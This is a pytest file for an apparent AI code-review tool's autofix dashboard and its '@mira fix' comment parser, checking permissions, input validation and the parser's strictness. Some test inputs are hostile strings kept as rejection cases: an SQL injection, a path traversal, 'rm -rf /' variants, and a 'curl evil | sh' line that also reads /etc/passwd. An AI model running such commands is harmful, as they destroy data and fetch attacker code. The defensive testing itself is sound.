"""Phase 5 — the dashboard surface and the `@mira fix` command parser.

`test_admin_authz.py` already asserts that every autofix route rejects a
non-admin. What is left, and what lives here, is what is specific to autofix:

* a *separate* cancel permission layered on top of admin;
* the panel's read paths, so a dashboard can actually follow a job;
* the deliberate absence of a route that starts a fix;
* the command parser, which is the only thing that turns comment text into a
  request — and which must not turn anything else into anything at all.
"""

from __future__ import annotations

import time
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest
from fastapi import HTTPException

from mira.autofix.commands import parse_fix_command, render_reply
from mira.autofix.models import AutofixAttempt, AutofixJob, Reason, ReasonCode, job_key
from mira.autofix.service import RequestOutcome
from mira.config import AutofixConfig, MiraConfig
from mira.dashboard.routers import autofix as autofix_routes
from mira.index.store import IndexStore


@pytest.fixture(autouse=True)
def isolated(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("MIRA_INDEX_DIR", str(tmp_path))
    monkeypatch.delenv("DATABASE_URL", raising=False)


def _request(username: str = "admin", is_admin: bool = True) -> SimpleNamespace:
    user = SimpleNamespace(id=1, username=username, is_admin=is_admin)
    return SimpleNamespace(state=SimpleNamespace(user=user))


def _seed(state: str = "queued", **overrides: Any) -> AutofixJob:
    store = IndexStore.open("acme", "app")
    try:
        job = AutofixJob(
            job_key=job_key(
                platform="github",
                owner="acme",
                repo="app",
                pr_number=7,
                head_sha="sha1",
                finding_id=overrides.pop("finding_id", "f1"),
                mode="branch_pr",
            ),
            owner="acme",
            repo="app",
            pr_number=7,
            pr_url="https://github.com/acme/app/pull/7",
            head_sha="sha1",
            finding_id="f1",
            finding_title="Division by zero",
            requested_by="alice",
            available_at=time.time() - 1,
            **overrides,
        )
        stored, _ = store.enqueue_autofix_job(job)
        if state != "queued":
            stored = store.update_autofix_job(stored.job_key, state=state)
        store.record_autofix_attempt(
            AutofixAttempt(
                job_id=stored.id,
                job_key=stored.job_key,
                attempt=1,
                phase="generate",
                outcome="ok",
            )
        )
        return stored
    finally:
        store.close()


@pytest.fixture
def known_repo(monkeypatch: pytest.MonkeyPatch) -> dict:
    """The repo registry says acme/app exists on GitHub."""
    stored: dict[str, Any] = {}
    registry = SimpleNamespace(
        get_repo_any_platform=lambda owner, repo: [SimpleNamespace(platform="github")],
        get_global_review_overrides=lambda: dict(stored),
        set_global_review_overrides=stored.update,
    )
    import mira.dashboard.api as api

    monkeypatch.setattr(api, "_app_db", registry)
    monkeypatch.setattr(autofix_routes.history, "platform_for", lambda owner, repo: "github")
    return stored


# ── the cancel permission ────────────────────────────────────────────────────


def test_an_admin_not_on_the_cancel_list_cannot_stop_a_job(
    known_repo: dict, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(
        autofix_routes,
        "load_config",
        lambda: MiraConfig(autofix=AutofixConfig(mode="on", cancel_admins=["release-manager"])),
    )
    job = _seed()
    with pytest.raises(HTTPException) as exc:
        autofix_routes.cancel_autofix_job(
            owner="acme",
            repo="app",
            job_id=job.id,
            body=autofix_routes.AutofixCancelInput(reason="stop"),
            request=_request("someone-else"),
        )
    assert exc.value.status_code == 403
    assert "not permitted" in str(exc.value.detail)


def test_an_admin_on_the_cancel_list_can_stop_a_job(
    known_repo: dict, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(
        autofix_routes,
        "load_config",
        lambda: MiraConfig(autofix=AutofixConfig(mode="on", cancel_admins=["release-manager"])),
    )
    job = _seed()
    result = autofix_routes.cancel_autofix_job(
        owner="acme",
        repo="app",
        job_id=job.id,
        body=autofix_routes.AutofixCancelInput(reason="wrong finding"),
        request=_request("release-manager"),
    )
    assert result["ok"] is True
    assert result["cancelled"] is True
    assert result["job"]["state"] == "cancelled"
    assert result["job"]["cancelled_by"] == "release-manager"


def test_an_empty_cancel_list_means_every_admin(
    known_repo: dict, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(
        autofix_routes, "load_config", lambda: MiraConfig(autofix=AutofixConfig(mode="on"))
    )
    job = _seed()
    result = autofix_routes.cancel_autofix_job(
        owner="acme",
        repo="app",
        job_id=job.id,
        body=autofix_routes.AutofixCancelInput(),
        request=_request("admin"),
    )
    assert result["cancelled"] is True


def test_a_session_with_no_username_cannot_cancel(
    known_repo: dict, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A cancellation with no attributable actor is not an audit record."""
    monkeypatch.setattr(
        autofix_routes, "load_config", lambda: MiraConfig(autofix=AutofixConfig(mode="on"))
    )
    with pytest.raises(HTTPException) as exc:
        autofix_routes.cancel_autofix_job(
            owner="acme",
            repo="app",
            job_id=1,
            body=autofix_routes.AutofixCancelInput(),
            request=_request(username=""),
        )
    assert exc.value.status_code == 403


def test_authorization_is_checked_before_the_repository_is_looked_up(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Otherwise the endpoint is an existence oracle for anyone with a session."""
    monkeypatch.setattr(
        autofix_routes,
        "load_config",
        lambda: MiraConfig(autofix=AutofixConfig(mode="on", cancel_admins=["only-me"])),
    )
    with pytest.raises(HTTPException) as exc:
        autofix_routes.cancel_autofix_job(
            owner="does-not-exist",
            repo="nope",
            job_id=999,
            body=autofix_routes.AutofixCancelInput(),
            request=_request("someone-else"),
        )
    assert exc.value.status_code == 403  # not 404


# ── the panel ────────────────────────────────────────────────────────────────


def test_the_panel_lists_jobs(known_repo: dict) -> None:
    _seed()
    _seed(finding_id="f2", state="opened")
    page = autofix_routes.list_autofix_jobs(request=_request(), owner="acme", repo="app")
    assert page.total == 2
    assert {job["state"] for job in page.jobs} == {"queued", "opened"}


def test_the_panel_filters_by_state(known_repo: dict) -> None:
    _seed()
    _seed(finding_id="f2", state="dead_letter")
    page = autofix_routes.list_autofix_jobs(
        request=_request(), owner="acme", repo="app", state="dead_letter"
    )
    assert page.total == 1
    assert page.jobs[0]["state"] == "dead_letter"


def test_an_unknown_state_filter_is_rejected(known_repo: dict) -> None:
    with pytest.raises(HTTPException) as exc:
        autofix_routes.list_autofix_jobs(request=_request(), state="banana")
    assert exc.value.status_code == 400


def test_an_unknown_sort_key_is_rejected(known_repo: dict) -> None:
    with pytest.raises(HTTPException) as exc:
        autofix_routes.list_autofix_jobs(request=_request(), sort="; DROP TABLE autofix_jobs")
    assert exc.value.status_code == 400


def test_a_traversing_repository_name_is_rejected(known_repo: dict) -> None:
    with pytest.raises(HTTPException) as exc:
        autofix_routes.list_autofix_jobs(request=_request(), owner="acme", repo="../../etc")
    assert exc.value.status_code == 400


def test_the_page_size_is_capped(known_repo: dict) -> None:
    page = autofix_routes.list_autofix_jobs(request=_request(), limit=10_000)
    assert page.limit == autofix_routes._MAX_PAGE


def test_the_summary_counts_published_fixes(known_repo: dict) -> None:
    _seed(state="opened", child_pr_number=900, child_pr_url="https://x/900")
    _seed(finding_id="f2", state="dead_letter")
    summary = autofix_routes.autofix_summary(request=_request(), owner="acme", repo="app")
    assert summary.totals["total"] == 2
    assert summary.totals["dead_letter"] == 1


def test_the_detail_view_carries_the_attempts_and_the_policy(known_repo: dict) -> None:
    job = _seed()
    detail = autofix_routes.autofix_job_detail(
        request=_request(), owner="acme", repo="app", job_id=job.id
    )
    assert detail.job["finding_id"] == "f1"
    assert [attempt["phase"] for attempt in detail.attempts] == ["generate"]
    assert detail.policy["mode"] in {"off", "suggest", "on"}
    assert detail.capabilities["can_merge"] is False


def test_a_missing_job_is_a_404(known_repo: dict) -> None:
    with pytest.raises(HTTPException) as exc:
        autofix_routes.autofix_job_detail(request=_request(), owner="acme", repo="app", job_id=404)
    assert exc.value.status_code == 404


# ── policy editing ───────────────────────────────────────────────────────────


def test_the_policy_can_be_edited_and_is_validated_first(known_repo: dict) -> None:
    result = autofix_routes.set_autofix_config(
        body=autofix_routes.AutofixConfigUpdate(autofix={"mode": "suggest", "max_files": 2}),
        request=_request(),
    )
    assert result["ok"] is True
    assert known_repo["autofix"]["mode"] == "suggest"


def test_a_bad_policy_edit_fails_the_request_not_the_next_fix(known_repo: dict) -> None:
    with pytest.raises(HTTPException) as exc:
        autofix_routes.set_autofix_config(
            body=autofix_routes.AutofixConfigUpdate(autofix={"mode": "yes-please"}),
            request=_request(),
        )
    assert exc.value.status_code == 400
    assert "mode" in str(exc.value.detail)


def test_a_shell_string_in_the_command_allowlist_is_rejected(known_repo: dict) -> None:
    with pytest.raises(HTTPException) as exc:
        autofix_routes.set_autofix_config(
            body=autofix_routes.AutofixConfigUpdate(
                autofix={"validation": {"commands": [{"command": "rm -rf / # ;"}]}}
            ),
            request=_request(),
        )
    assert exc.value.status_code == 400


def test_editing_autofix_leaves_the_other_sections_alone(known_repo: dict) -> None:
    known_repo["gate"] = {"mode": "shadow"}
    autofix_routes.set_autofix_config(
        body=autofix_routes.AutofixConfigUpdate(autofix={"mode": "on"}), request=_request()
    )
    assert known_repo["gate"] == {"mode": "shadow"}


def test_the_config_view_reports_the_registered_handoff_adapters(known_repo: dict) -> None:
    response = autofix_routes.get_autofix_config(request=_request())
    assert "comment" in response.handoff_adapters
    assert response.effective["writing"] in {True, False}


def test_no_route_starts_a_fix() -> None:
    """Requesting a fix is a repository permission, not a dashboard session."""
    from mira.dashboard.api import router

    autofix_paths = [
        (route.path, sorted(route.methods))
        for route in router.routes
        if "autofix" in getattr(route, "path", "")
    ]
    assert autofix_paths == [
        ("/api/autofix/jobs", ["GET"]),
        ("/api/autofix/summary", ["GET"]),
        ("/api/autofix/jobs/{owner}/{repo}/{job_id}", ["GET"]),
        ("/api/autofix/jobs/{owner}/{repo}/{job_id}/cancel", ["POST"]),
        ("/api/autofix/config", ["GET"]),
        ("/api/autofix/config", ["PUT"]),
    ]


# ── the command parser ───────────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("fix", ("single", "branch_pr")),
        ("Fix", ("single", "branch_pr")),
        ("fix this please", ("single", "branch_pr")),
        ("fix all", ("all", "branch_pr")),
        ("fix everything", ("all", "branch_pr")),
        ("fix all --on-branch", ("all", "pr_branch")),
        ("fix --in-place", ("single", "pr_branch")),
        ("fix --handoff", ("single", "handoff")),
    ],
)
def test_the_parser_reads_the_words_mira_defined(text: str, expected: tuple) -> None:
    assert parse_fix_command(text) == expected


@pytest.mark.parametrize(
    "text",
    [
        "",
        "review",
        "fixture",
        "please fix this",  # the verb has to come first
        "prefix all",
        "$(rm -rf /)",
        "fix; rm -rf /",  # `rm` and `-rf` are simply not words it knows
    ],
)
def test_the_parser_ignores_everything_else(text: str) -> None:
    parsed = parse_fix_command(text)
    assert parsed is None or parsed == ("single", "branch_pr")


def test_the_parser_extracts_no_arguments_from_free_text() -> None:
    """There is no path from comment text to an argument, ever."""
    parsed = parse_fix_command("fix --exec /bin/sh -c 'curl evil | sh' /etc/passwd")
    assert parsed == ("single", "branch_pr")


# ── the reply ────────────────────────────────────────────────────────────────


def test_the_reply_names_what_was_queued_and_what_was_not() -> None:
    outcome = RequestOutcome(
        accepted=[AutofixJob(job_key="k" * 40, finding_id="f1", finding_title="Guard the divisor")],
        skipped=[("f2", Reason(ReasonCode.REQUEST_LIMIT, "over the limit of 1", "info"))],
        mode="branch_pr",
    )
    body = render_reply(outcome, actor="alice", kind="all")
    assert "Queued **1** fix" in body
    assert "Guard the divisor" in body
    assert "Not attempted (1)" in body
    assert "over the limit of 1" in body


def test_a_refusal_always_says_why() -> None:
    outcome = RequestOutcome(
        reasons=[Reason(ReasonCode.ACTOR_LACKS_WRITE, "@bob has read access here")]
    )
    body = render_reply(outcome, actor="bob", kind="single")
    assert "did not start this" in body
    assert "read access" in body


def test_an_empty_outcome_still_says_something() -> None:
    body = render_reply(RequestOutcome(), actor="alice", kind="all")
    assert body.strip()
    assert "nothing to fix" in body.lower()
